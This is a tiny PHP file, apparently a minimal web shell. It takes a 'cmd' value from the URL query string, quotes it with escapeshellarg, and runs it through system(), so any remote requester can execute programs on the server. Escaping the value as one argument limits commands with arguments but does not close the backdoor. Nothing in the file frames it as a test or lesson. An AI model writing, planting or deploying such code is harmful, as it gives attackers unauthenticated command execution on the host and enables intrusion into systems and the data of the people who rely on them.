<?php
$cmd = $_GET['cmd'];
$cmd = escapeshellarg($cmd);
system($cmd);
